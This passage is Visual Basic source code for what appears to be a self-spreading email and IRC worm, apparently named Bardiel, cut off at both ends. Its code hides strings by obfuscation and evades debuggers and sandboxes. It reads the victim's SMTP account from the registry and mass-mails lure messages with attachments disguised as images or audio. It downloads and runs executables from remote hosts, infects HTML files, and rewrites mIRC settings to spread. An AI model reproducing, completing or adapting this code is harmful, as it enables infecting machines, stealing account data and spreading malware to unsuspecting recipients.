Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
    
Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile
    
Open vsFullPathname For Binary As FileIn
sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
For i = 1 To l Step 3

Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)
        
If Len(s) > 64 Then
s = s & vbCrLf: sResult = sResult & s: s = ""
End If

b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
Next i

If Not (LOF(FileIn) Mod 3 = 0) Then
For i = 1 To (LOF(FileIn) Mod 3)
Get FileIn, , bin(i - 1)
Next i
If (LOF(FileIn) Mod 3) = 2 Then
b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
s = s & Base64Tab(b): s = s & "="
Else
b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): s = s & "=="
End If
End If

If s <> "" Then
s = s & vbCrLf: sResult = sResult & s
End If
s = ""
Close FileIn: B64 = sResult
End Function

Private Sub Bt1_Timer()
On Error Resume Next: Bt1.Enabled = False: Static Btv1 As Integer
If Btv1 = 60 Then
Btv1 = 0
If BCopy = 2 Then FdInfected: Bw.run Sp(1) & q("[") & key1: Bw.run Sp(1) & q("[") & key3
If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[DhjSnjb")) <> CStr(Day(Date))) And (BCopy = 2) Then Call BComponents
If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[FdsSnjb")) <> CStr(Day(Date))) And (BCopy = 2) Then Call Actualizer
If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[TjswSnjb")) <> CStr(Day(Date))) And (BCopy = 1) Then Call BSendMail
Else
Btv1 = Btv1 + 1
End If
Bt1.Enabled = True
End Sub

Function DowFile(BURL As String, BPath As String) As Boolean
On Error Resume Next: Dim lngRetVal As Long
lngRetVal = URLDownloadToFile(0, BURL, BPath, 0, 0)
DowFile = IIf(lngRetVal = 0, True, False)
End Function

Function IsMail(ML)
On Error Resume Next: Dim R(20) As String
R(0) = "/": R(1) = "\": R(2) = "?": R(3) = "="
R(4) = ">"
R(5) = "<": R(6) = Chr(34): R(7) = ";": R(8) = ","
R(9) = Chr(37): R(10) = "¡": R(11) = "¿": R(12) = ")"
R(13) = "(": R(14) = "virus": R(15) = Chr(32): R(16) = ":"
R(17) = "[": R(18) = "]": R(19) = ".."
For k = 0 To 19
If InStr(ML, R(k)) <> 0 Then
IsMail = False
Exit Function
End If
Next
X1 = InStr(ML, "@"): X2 = InStr(ML, ".")
If (X1 <> 0) And (X2 <> 0) And (X1 < X2) Then IsMail = True Else IsMail = False
End Function

Sub MailsSend()
On Error Resume Next: Dim v As String: v = ""

sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

For i = 0 To UBound(sHn)
sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
If sHle <> (((100 And 1) + 1) ^ 0) * -(3 And 9) Then End
Next


sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)Bb[Wfso"))

For x = 0 To UBound(sRg)
sRr = Rr(sRg(x))
If sRr <> v Then End
Next

For Each strEnv In Bw.Environment(q("WUHDBTT"))
       If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
Next

If IsDebuggerPresent() <> ((7 And 9) / 9) * (((6 Xor 7) * (0 Xor 7)) Xor 7) * ((9 Or 3) * 9) Then End
End Sub

Function BEML(xx, xy)
On Error Resume Next: Dim eb0 As String, eb00 As String, eb000 As String, Bnm As String, MVC As String
Randomize: R = Int(Rnd * 30) + 1

If InStr(LCase(LanguageID), q("btwföhk")) <> 0 Then
MVC = "<br><p>" & q(":::::::::::::::::::::::::::::Jdfaab'Qnurt'Tdfi:::::::::::::::::::::::::::::") & "<br><p>" & vbCrLf & _
q("'''Ubtrksfch'cbk'Fiækntnt='Jbitfmb'~'Fcmrish'kneub'cb'qnurt") & "<br><p>" & vbCrLf & _
q(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::")
Select Case R
Case 1
eb0 = q("Whtsfk'Finjfcf"):
eb00 = q("Of'ubdnench'rif'whtsfk'cbtcb'btsf'cnubddnhi") & vbCrLf & _
q("wfuf'qbukf'cbtdfu`rbkf'fisbt'cb'0'cnft'cb'ubdnench'btsb'b*jfnk") & vbCrLf & _
q("Ri'Tbuqndnh'cb'AubbDfuct")
eb000 = q("AubbDfuc)tdu")
Case 2
eb0 = q("Dfushhit"):
eb00 = q("Irbtsuf'wf`nif'cb'Dfushhit'qnbib'ubdfu`fcf") & vbCrLf & _
q("jnuf'btsb'vrb'tb'snsrkf=' Bk'nihabitnqh'wfmfunsh ")
eb000 = q("DfushhiUbkhfcbc)tdu")
Case 3
eb0 = q("Aubb'TdubbiTfqbu")
eb00 = q("Jnuf'btsb'tdubbitfqbu+'~'tn'sb'`rtsf+'qntnsf'irbtsuf'wf`b'=.")
eb000 = q("ErtoXqtXTfcfj)tdu")
Case 4
eb0 = q("AhucPfub"):
eb00 = q("Tfebt'kh'vrb'bt'bk'AhucPfub8+'bishidbt'jnuf'btsb"):
eb000 = q("ApKnqb)efs")
Case 5
eb0 = q("Btwbuh'sb'`rtsb")
eb00 = q("Jnuf'kf'whtsfk':."): eb000 = q("J~Dfuc)tdu")
Case 6
eb0 = q("Btsf'bt'erbif"): eb00 = q("Ofebu'vrb'sb'wfubdb'f'sn8"): eb000 = q("Finjfdnhi)efs")
Case 7
eb0 = q("Fqnth'Njwhusfisb"):
eb00 = q("Cbench'f'kf'irbqf'whknsndf'cbk'tbuqnchu+'tb'wncb'f'kht'rtrfunht") & vbCrLf & _
q("dhjwkbsfu'bk'irbqh'ub`ntsuh'f'ani'cb'whcbu'dhitbuqfu'trt'drbisft'cb'dhuubh")
eb000 = q("Ub`ntsuh)wna")
Case 8
eb0 = q("Tbh'Sfisundh")
eb00 = q("Dhihdbt'bk'tbh'sfisundh8") & vbCrLf & _
q("Sfisuf='Fisn`rf'cntdnwknif'hunbisfk'wfuf'jbmhufu'bk'ubicnjnbish'tbrfk") & vbCrLf & _
q("Fwubicbkh'~'ihsf'kf'cnabubidnf)")
eb000 = q("tbsfisuf)wna")
Case 9
eb0 = q("Tn`inandfch'cb'kht'ihjeubt"):
eb00 = q("Vrnbubt'tfebu'bk'tn`inandfh'cb'sr'ihjeub+'h'fwbkknch'h'cb'chicb'wuhqnbib8"):
eb000 = q("hun`ifjb)wna")
Case 10
eb0 = q("Jfirfk'Tbcrddnhi"):
eb00 = q("Vrnbubt'dhivrntsfu'rif'wfubmf8+'wurbef'dhi'btsht'dhitbmht"):
eb000 = q("JfirfkTbd)wna")
Case 11
eb0 = q("nkrtnhibt"):
eb00 = q("Jnuf'kf'ahsh'fcmrisf'57'tb`richt'~'qbuft'fk`h")
eb000 = q("nkrtnhi)efs")
Case 12
eb0 = q("On"): eb00 = q("Sb'biqnh'kft'njf`bibt'vrb'wbcntsb+'e~b"): eb000 = q("Njf`bt)tdu")
Case 13
eb0 = q("Obkw'jb"): eb00 = q("wkbftb'hwbi'ankb"): eb000 = q("jb)tdu")
Case 14
eb0 = q("Jfnk'Ubsrui'T~tsbj"):
eb00 = q("Bk'dhuubh'ih'wrch'tbu'biqnfch'f'rih'h'jæt'cbtsnifsfunht)"):
eb000 = q("JfnkXAnkb)efs")
Case 15
eb0 = q("Ahsht'bi'sr'bjfnk"): eb00 = q("___'Shch'Qfkb'___"): eb000 = q("njf`bt)tdu")
Case 16
eb0 = q("Qncf'bi'Jfusb8"):
eb00 = q("Jnuf'kft'rksnjft'njf`bibt'cbk'wkfibsf'uhmh'bi'btsb'tdubbitfqbu"):
eb000 = q("Jfusb)tdu")
Case 17
eb0 = q("Kbbkh'cbsbincfjbisb"): eb00 = q("Jb'wfubdb'vrb'btsh'sb'nisbubtfuf+'e~b"): eb000 = q("Chdrjbisc)wna")
Case 18
eb0 = q("Efmfu'cb'wbth'bi'67'wftht"): eb00 = q("Dfitfch'cb'cnbsft+'wftsnkkft'wfuf'fcbk`f}fu8'jnuf'btsh"): eb000 = q("_Sbi)efs")
Case 19
eb0 = q("Obdon}ht'Afdnkbt"): eb00 = q("Wfuf'bk'fjhu+'cnibuh'~'tfkrc"): eb000 = q("Od})efs")
Case 20
eb0 = q("Kf'Qbi`fi}f'cb'kht'whkkht")
eb00 = q("Kf'`unwb'cb'kht'whkkht+'jft'wbkn`uhtf'vrb'bk'Tfut+'kf'irbqf") & vbCrLf & _
q("biabujbcfc'vrb'whcunf'f}hsfu'fk'jrich"):
eb000 = q("@CW)dhj")
Case 21
eb0 = q("Afisftjft8"): eb00 = q("Jnuf'~'dubb"): eb000 = q("@ohts)efs")
Case 22
eb0 = q("Tb'Aubb'PbeDfj"): eb00 = q("Tb'PbeDfj'@ufsnt+'jnufiht'<."): eb000 = q("TbPbeDfj)tdu")
Case 23
eb0 = q("Jnuf'jn'ahsh"): eb00 = q("Rif'whtsfk'dhisbinbich'rif'ahsh'wbuthifk'kb'f'tnch'biqnfcf"): eb000 = q("njf`b7577)wna")
Case 24
eb0 = q("Bk'hsuh'kfch'cbk'Btwbmh"): eb00 = q("2'tböfkbt'wtvrnfsundfjbisb'wuhefcft+'wfuf'tfebu'tn'rif'wbuthif'sb'btsf'jnisnbich"): eb000 = q("wtn)tdu")
Case 25
eb0 = q("Ofdlbfut'Jfnkt"): eb00 = q("Vrnbubt'ofdlbfu'ri'jfnk+'wurbef'dhi'btsh':."): eb000 = q("OfdlJfnk)efs")
Case 26
eb0 = q("Ojala te guste"): eb00 = q("Jnuf'bk'fudonqh'=."): eb000 = Rm()
Case 27
eb0 = q("Drfish'Tfebt'cbk'tbh8"): eb00 = q("Fqbun`rfkh'~'fwubicb'fvrn"): eb000 = q("TbSbts)dhj")
Case 28
eb0 = q("on"): eb00 = q("Jnuf'btsh"): eb000 = P2PName("Bg")
Case 29
eb0 = q("fkjft'wbucncft"): eb00 = q("Shch'btsfuf'enbi'bi'kf'snbuuf+'jnbisuft'cnht'tb'vrbcb'bi'tr'dnbkh"): eb000 = q("Dfknltsh)tdu")
Case 30
eb0 = q("tfkrcht"): eb00 = q("todo comienza ahora en este instante"): eb000 = q("cbknwf)efs")
End Select

Else
MVC = "<br><p>" & q(":::::::::::::::::::::::::::::Jdfaab'Qnurt'Tdfi:::::::::::::::::::::::::::::") & "<br><p>" & vbCrLf & _
q("'''Ubtrks'`nqbt'sob'Fifk~tnt='Jbttf`b'fic'Fccbc'aubb'ob'`nqbt'qnurt") & "<br><p>" & vbCrLf & _
q(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::")
Select Case R
Case 1
eb0 = q("Knqbk~'Whtsdfuc"):
eb00 = q("ob(tob'oft'ubdbnqbc'f'whtsdfuc'auhj'sont'fccubtt") & vbCrLf & _
q("sh'tbb'ns'cntdofu`bt'ns'ebahub'0'cf~t'ob(tob'`nqbt'ubdbnqbc'sont'b*jfnk") & vbCrLf & _
q("F'Tbuqndb'`nqbt'AubbDfuct")
eb000 = q("AubbDfuc)tdu")
Case 2
eb0 = q("Dfushhit")
eb00 = q("Hru'ns'wf`nifsbt'ob(tob'`nqbt'Dfushhit'ob(tob'dhjbt'bkfehufsb") & vbCrLf & _
q("ob(tob'khhlt'fs'sont'sofs'nt'snskbc=' 'Sob'nihaabitnqb'wfmfunsh ")
eb000 = q("DfushhiUbkhfcbc)tdu")
Case 3
eb0 = q("Aubb'TdubbiTfqbu")
eb00 = q("ob(tob'Khhlt'fs'sont'tdubbitfqbu+'fic'na'~hr'knlb'ns+'ns'qntnst'hru'wf`b=.")
eb000 = q("ErtoXqtXTfcfj)tdu")
Case 4
eb0 = q("AhucPfub")
eb00 = q("ch'~hr'Lihp'pofs'sob'AhucPfub'nt8+'sobi'ob(tob'chbt'khhl'fs'sont"):
eb000 = q("ApKnqb)efs")
Case 5
eb0 = q("N'Pfns'~hr'knlb")
eb00 = q("ob(tob'Khhlt'fs'sob'whtsdfuc':."): eb000 = q("J~Dfuc)tdu")
Case 6
eb0 = q("nt'Sont'`hhc"): eb00 = q("sh'Ofqb'sofs'~hr'anic'ns8"): eb000 = q("Finjfdnhi)efs")
Case 7
eb0 = q("N'Pfui'Njwhusfis"):
eb00 = q("crb'sh'sob'ibp'whknsndt'ob(tob'`nqbt'sob'tbuqfis+'ns'nt'ubvrbtsbc'sh'sob'rtbut") & vbCrLf & _
q("sh'dhjwkbsb'sob'ibp'ub`ntsufsnhi'ni'hucbu'sh'eb'fekb'sh'dhitbuqb'sobnu'~hr'dhris'ob(tob'`nqbt'jfnk")
eb000 = q("Ub`ntsbu)wna")
Case 8
eb0 = q("Tb'Sfisundh")
eb00 = q("ch'~hr'Lihp'sob'tb'sfisundh8") & vbCrLf & _
q("Sfisuf='jnkkbiinfk'hunbisfk'cntdnwknibt'sh'njwuhqb'sob'tbrfk'~nbkc") & vbCrLf & _
q("~hr'Kbfui'ns'fic'ob(tob'ihsndbt'sob'cnaabubidb)")
eb000 = q("tbsfisuf)efs")
Case 9
eb0 = q("Jbfini`'`nqbt'sob'ifjbt"):
eb00 = q("ch'~hr'Pfis'sh'lihp'sob'tn`inandfh'~hru'ifjb'ob(tob'`nqbt+'hu'ch'N'indlifjb'hu'ch'`nqb'pobub'ns'dhjbt8"):
eb000 = q("hun`ifjb)efs")
Case 10
eb0 = q("Jfirfk'Tbcrdsnhi"):
eb00 = q("ch'~hr'Pfis'sh'dhivrbu'f'dhrwkb8+'chbt'ns'wuhqb'pnso'sobtb'fcqndb"):
eb000 = q("JfirfkTbd)wna")
Case 11
eb0 = q("~hr'ernkc'rw'ohwbt"):
eb00 = q("ob(tob'Khhlt'fs'sob'wndsrub'bidkhtbc'57'tbdhict'fic'surso'thjbsoni`")
eb000 = q("nkrtnhi)efs")
Case 12
eb0 = q("On"): eb00 = q("N'tonw'^hr'sob'njf`bt'sofs'~hr'ubvrbtsbc+'e~b"): eb000 = q("Njf`bt)tdu")
Case 13
eb0 = q("Obkw'jb"): eb00 = q("wkbftb'hwbi'ankb"): eb000 = q("jb)tdu")
Case 14
eb0 = q("Jfnk'Ubsrui'T~tsbj"):
eb00 = q("Sob'jfnk'dhrkc'ihs'eb'f'dhuubtwhicbis'sh'hib'hu'jhub'fccubttbbt)"):
eb000 = q("JfnkXAnkb)efs")
Case 15
eb0 = q("Wndsrubt'ni'~hru'bjfnk"): eb00 = q("___'Fkk'Qhrdobu'___"): eb000 = q("njf`bt)tdu")
Case 16
eb0 = q("~hr'Ubfc'ns'fssbisnqbk~"): eb00 = q("N'anic'sofs'sont'nisbubtsbc'~hr+'e~b"): eb000 = q("Chdrjbisc)wna")
Case 17
eb0 = q("Knab'ni'Jfut8"):
eb00 = q("ob(tob'Khhlt'fs'sobj'~hr'aninto'njf`bt'ob(tob'`nqbt'sob'ubc'wkfibs'ni'sont'tdubbitfqbu"):
eb000 = q("Jfusb)tdu")
Case 18
eb0 = q("chbt'sh'Khpbu'pbn`os'`nqb'ni'67'tsbwt"): eb00 = q("Snubc'ob(tob'`nqbt'cnbst+'wnkkt'sh'khtb'pbn`os8'ob(tob'khhlt'fs'sont"): eb000 = q("_Sbi)efs")
Case 19
eb0 = q("Bft~'Dofujt"): eb00 = q("Wfuf'sob'khqb+'jhib~'fic'obfkso"): eb000 = q("Od})efs")
Case 20
eb0 = q("The Vengeance gives the chickens"):
eb00 = q("The flu gives the chickens, but dangerous that the Sars, the new one") & vbCrLf & _
q("nkkibtt'sofs'dhrkc'ponw'sh'sob'phukc"):
eb000 = q("@CW)dhj")
Case 21
eb0 = q("@ohtst8"): eb00 = q("chbt'ob(tob'Khhl'fic'chbt'ob(tob'ebknbqb"): eb000 = q("@ohts)efs")
Case 22
eb0 = q("Tb'Aubb'PbeDfj"): eb00 = q("Tb'PbeDfj'Aubb+'khhlt'fs'rt<."): eb000 = q("TbPbeDfj)tdu")
Case 23
eb0 = q("ob(tob'Khhlt'fs'j~'wndsrub"): eb00 = q("F'whtsdfuc'dhisfnini`'f'wbuthifk'wndsrub'ofc'ebbi'f'dhuubtwhicbis"): eb000 = q("njf`b7577)wna")
Case 24
eb0 = q("Sob'afutncb'`nqbt'sob'Jnuuhu"): eb00 = q("2'whnis'hrs'sbtsbc'wtvrnfsundfjbisb+'sh'lihp'na'f'wbuthi'~hr'sont'k~ni`"): eb000 = q("wtn)tdu")
Case 25
eb0 = q("Ofdlbfut'Jfnkt"): eb00 = q("~hr'Pfis'ofdlbfu'f'jfnk+'ns'wuhqbt'sobubpnso':."): eb000 = q("OfdlJfnk)efs")
Case 26
eb0 = q("@hc'pnkkni`'~hr'knlb"): eb00 = q("ob(tob'Khhlt'fs'sob'ankb'=."): eb000 = Rm()
Case 27
eb0 = q("As much as you Know the sex does he/she give?"): eb00 = q("ch'~hr'Cntdhqbu'ns'fic'chbt'ob(tob'kbfui'obub"): eb000 = q("TbSbts)efs")
Case 28
eb0 = q("on"): eb00 = q("ob(tob'Khhlt'fs'sont"): eb000 = P2PName("B")
Case 29
eb0 = q("khts'thrkt"): eb00 = q("bqbu~soni`'ni'sob'Bfuso'btsfuf'pbkk+'ponkb'@hc'ubjfnit'ni'nst'tl~"): eb000 = q("Dfknltsh)tdu")
Case 30
eb0 = q("`ubbsni`t"): eb00 = q("What?"): eb000 = q("cbknwf)efs")
End Select

End If
If Int((Rnd * 2) + 1) = 2 Then eb00 = eb00 & vbCrLf & vbCrLf & MVC
If xy = 0 Then
ctmime = "Content-Type: application/octet-stream;" & vbCrLf & _
Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-Disposition: attachment;" & vbCrLf & _
Chr(9) & "filename=" & Chr(34) & eb000 & Chr(34) & vbCrLf
Else
Randomize: ctn = Int(Rnd * 2) + 1
If ctn = 1 Then
Dim ctsp(0 To 1) As String: ctsp(0) = Left(eb000, Len(eb000) - 3): ctsp(1) = Right(eb000, 3)
ctmime = "Content-Type: image/jpeg;" & vbCrLf & _
"Content-Disposition: attachment;" & vbCrLf & Chr(9) & _
"filename=" & Chr(34) & ctsp(0) & "jpg (10.7 KB)" & Space(261 - (Len(ctsp(0)) + 19)) & "." & ctsp(1) & ".jpg" & Chr(34) & vbCrLf
ElseIf ctn = 2 Then
ctmime = "Content-Type: audio/x-wav;" & vbCrLf & _
Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-ID: <BARDIEL>" & vbCrLf
eb00 = eb00 & vbCrLf & "<iframe src=cid:BARDIEL" & "><" & "/iframe>"
End If
End If

Boundary = "----=_NextPart_000_0002_01BD22EE.C1291DA0"
BEML = "From: " & Chr(34) & xx & Chr(34) & " <" & Bnm & ">" & vbCrLf & _
"Subject: " & eb0 & vbCrLf & "DATE:" & Chr(32) & Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & vbCrLf & _
"MIME-Version: 1.0" & vbCrLf & "Content-Type: multipart/mixed;" & vbCrLf & _
Chr(9) & "boundary=" & Chr(34) & Boundary & Chr(34) & vbCrLf & _
"X-Priority: 3" & vbCrLf & "X-MSMail - Priority: Normal" & vbCrLf & _
"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & "" & vbCrLf & _
"Esto es un mensaje multiparte en formato MIME" & vbCrLf & "" & vbCrLf & _
"--" & Boundary & vbCrLf & "Content-Type: text/html;" & vbCrLf & _
Chr(9) & "charset=" & Chr(34) & "x-user-defined" & Chr(34) & vbCrLf & _
"Content-Transfer-Encoding: 8bit" & vbCrLf & "" & vbCrLf & eb00 & vbCrLf & "" & vbCrLf & _
"--" & Boundary & vbCrLf & ctmime & "Content-Transfer-Encoding: base64" & vbCrLf & "" & vbCrLf & _
BC4 & vbCrLf & "" & vbCrLf & "--" & Boundary & "--"
End Function

Private Sub Bt2_Timer()
On Error Resume Next: Bt2.Enabled = False: SearchScan: Bt2.Enabled = True
End Sub

Sub SearchScan()
On Error Resume Next
If GetWinVersion() = 2 Then KantiNT Else KAnti98
Dim Src As Boolean
Src = EnumWindows(AddressOf FuncSearchScan, ByVal 0&)
End Sub

Sub BSendMail()
On Error Resume Next: Dim sBInfo As String
If (InDat(1) <> "") And (Len(InDat(1)) > 4) And (InStr(InDat(1), ".") <> 0) And (IsMail(InDat(2)) = True) Then
bSmtp InDat(1), Sp(2) & q("[JfnkO)cfs"), InDat(2), 0
bSmtp InDat(1), Sp(2) & q("[JfnkK)cfs"), InDat(2), 0
bSmtp InDat(1), Sp(2) & q("[JfnkJ)cfs"), InDat(2), 1
Else
bSmtp q("jfnk)ohsjfnk)dhj"), Sp(2) & q("[JfnkO)cfs"), q("ficubf5777Gohsjfnk)dhj"), 0
bSmtp q("j6)kfsnijfnk)dhj"), Sp(2) & q("[JfnkK)cfs"), q("ufrkXJGkfsnijfnk)dhj"), 0
End If
sBInfo = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ENiah"))
If sBInfo = "" Then
Call SendBackDat
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ENiah"), "1", ""
End If
End Sub

Function InDat(n) As String
On Error Resume Next
Select Case n
Case 1
InDat = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Nisbuibs'Fddhris'Jfif`bu[Fddhrist[77777776[TJSW'Tbuqbu"))
Case 2
InDat = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Nisbuibs'Fddhris'Jfif`bu[Fddhrist[77777776[TJSW'Bjfnk'Fccubtt"))
End Select
End Function

Sub BHtmlInfected(Bhl)
On Error Resume Next: SA Bhl, 0
Set H1 = Bf.OpenTextFile(Bhl)
Hr1 = H1.ReadLine
If InStr(Hr1, q("JNJB")) <> 0 Then
H1.Close
Exit Sub
Else
Hr2 = H1.ReadAll: H1.Close
End If

For i = 1 To Len(Hr2)
Ck = Asc(Mid(Hr2, i, 1))
If Ck = Asc("%") Then
EC = EC & "¥"
ElseIf Ck = 13 Then
EC = EC & Chr(28)
ElseIf Ck = 10 Then
EC = EC & Chr(29)
Else
EC = EC & Chr(Ck Xor 7)
End If
Next

EC = q("Efucnbk':'B/") & Chr(34) & EC & Chr(34) & q(".")

Set H2 = Bf.OpenTextFile(Bhl, 2, 1)
H2.write BScript1 & EC & BScript2
H2.Close
End Sub

Sub BComponents()
On Error Resume Next
If BState = False Then Exit Sub
Dim Apm(1 To 6) As String, apc As Integer: Randomize

If Not (Flx(Sp(1) & q("[wl}nw)bb"))) Then
c = DowFile(q("ossw=((rtrfunht)k~dht)bt(`bcjcj(wl}nw)eni"), Sp(1) & q("[wl}nw)bb"))

If c <> True Then
apc = Int(Rnd * 5) + 1
Apm(1) = q("ossw=((cej6)biq~)ir(wl}nw)eni")
Apm(2) = q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(wl}nw)eni")
Apm(3) = q("ossw=((`bcjcj)rinsbc)ibs)l`(wl}nw)eni")
Apm(4) = q("ossw=((`bcjcj)whus2)dhj(wl}nw)eni")
Apm(5) = q("ossw=((mej6)biq~)ir(wl}nw)eni")
c = DowFile(Apm(apc), Sp(1) & q("[wl}nw)bb"))
End If

End If

c = False

If Not (Flx(Sp(0) & q("[dfw)bb"))) Then
c = DowFile(q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(dfw)eni"), Sp(0) & q("[dfw)bb"))
If c = True Then Bw.run Sp(0) & q("[dfw)bb")
End If

Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[DhjSnjb"), Day(Date), ""
End Sub

Function IsMReg(M) As Boolean
On Error Resume Next: Dim M1 As String
M1 = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Jfnk[") & M)
If M1 = "" Then
IsMReg = True
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Jfnk[") & M, q("EJfnk"), ""
Else
IsMReg = False
End If
End Function

Sub BMirc(M)
On Error Resume Next: Dim mo As String, MCV As String, M1 As String, M2 As String, M3 As String, M4 As String, M5 As String, Mq As String, M7 As String, M8 As String, M9 As String, zM10 As String

WIni q("uankbt"), q("i5"), q("ejnud)okw"), M & q("[Jnud)nin")
WIni q("pfui"), q("atbuqb"), q("haa"), M & q("[Jnud)nin")
WIni q("pfui"), q("cdd"), q("haa"), M & q("[Jnud)nin")
WIni q("ankbtbuqbu"), q("pfuini`"), q("haa"), M & q("[Jnud)nin")
WIni q("sbs"), q("Vrns"), q("?+6Ahsht'___3+6'ossw=((ossw=((rtrfunht)k~dht)bt(`bcjcj(kbtenfi)mw`?+6'___'Ahsht"), M & q("[Jnud)nin")
mo = IniR(q("hwsnhit"), q("i5"), M & q("[Jnud)nin")): mo = Mid(mo, 1, 10) & q("6+6") & Mid(mo, 14): WIni q("hwsnhit"), q("i5"), mo, M & q("[Jnud)nin")
mo = IniR(q("hwsnhit"), q("i7"), M & q("[Jnud)nin")): mo = Mid(mo, 1, 37) & q("+6+") & Mid(mo, 41): WIni q("hwsnhit"), q("i7"), mo, M & q("[Jnud)nin")

M1 = q("dsdw'6=(-=-=|')dsdwubwk~'#indl'('Ubdnench'{'na'/Gql)Twn':'#surb.'|'qfu'Ge'#ubjhqb/#6*+(.'{'Ge'{'(dkbfu'{'ofks'z'z") & vbCrLf & _
q("Hi'6=Sbs=riwftt-=-=|'qfu'Gs4':'#ubjhqb/#6+riwftt.'{'na'/Gs4'::'#dou/674.'#,'#dou/676.'#,'#dou/677.'#,'#dou/67>.'#,'#dou/672..'|')tbs'Gql)Tw~'#afktb'{')wunqjt`'#indl'Sbujnifich'Tbdnhi'cb'Dhisuhk'Ubjhsh'=.'z") & vbCrLf & _
q("bktb'|')wunqjt`'#indl'wftt'nidhuubds'=/'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
q("Hi'6=SB_S=wftt-=-=|'qfu'Gs':'#ubjhqb/#6+wftt.'{'na'/Gs'::'#dou/674.'#,'#dou/676.'#,'#dou/677.'#,'#dou/67>.'#,'#dou/672..'|')tbs'Gql)Twn'#surb'{')tbs'Gql)indl'#indl'{')wunqjt`'#indl'Nindnfich'Tbdnhi'cb'Dhisuhk'Ubjhsh'=.'z") & vbCrLf & _
q("bktb'|')wunqjt`'#indl'wftt'nidhuubds'=/'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
q("Hi'6=Sbs=SUE-=-=|'na'/Gql)Twn':'#afktb.'|'ofks'z'{'qfu'Gss':'#ubjhqb/#6+SUE.'{'na'/Gss'::'TwnNHi.'|')tbs'GTwnN'#surb'z") & vbCrLf & _
q("''bktbna'/Gss'::'TwnSdHi.'|')tbs'GTwnSd'#surb'z'{'bktbna'/Gss'::'TwnSwHi.'|')tbs'GTwnSw'#surb'z'{'bktbna'/Gss'::'TwnNHaa.'|')tbs'GTwnN'#afktb'z'{''bktbna'/Gss'::'TwnSHaa.'|')tbs'GTwnSd'#afktb'{')tbs'GTwnSw'#afktb'z") & vbCrLf & _
q("''bktbna'/Gss'::'Twnlb~.'|')cdd'tbic'*d'#indl'#jnudcnu'#,'jnudlb~)`c'z'{'bktbna'/Gss'::'Twncnu.'|')atbuqb'#indl'4'#kbas/#jnudcnu+4.'z") & vbCrLf & _
q("bktbna'/Gss'::'Ekk.'|')cntdhiibds'{')bns'z'{'bktbna'/Gss'::'nw.'|')wunqjt`'Gql)indl'#nw'z'{'(dkhtb'*dj'#indl'z") & vbCrLf & _
q("Hi'6=Sbs=-=8=|'na'/GTwnSw':'#surb.'|')wunqjt`'Gql)indl';'#,'#Indl'#,'9'#,'#6*'z'{'na'/suhmfi'ntni'#6*.'{{'/phuj'ntni'#6*.'{{'/suh~fih'ntni'#6*.'{{'/qnurt'ntni'#6*.'|')n`ihub'#indl'{')dkhtb'*dj'#indl'z'z") & vbCrLf & _
q("Hi'6=Sbs=-=$=|'na'/GTwnSd':'#surb.'|')wunqjt`'Gql)indl';'#,'#Indl'#,'9'#,'#6*'z'z") & vbCrLf & _
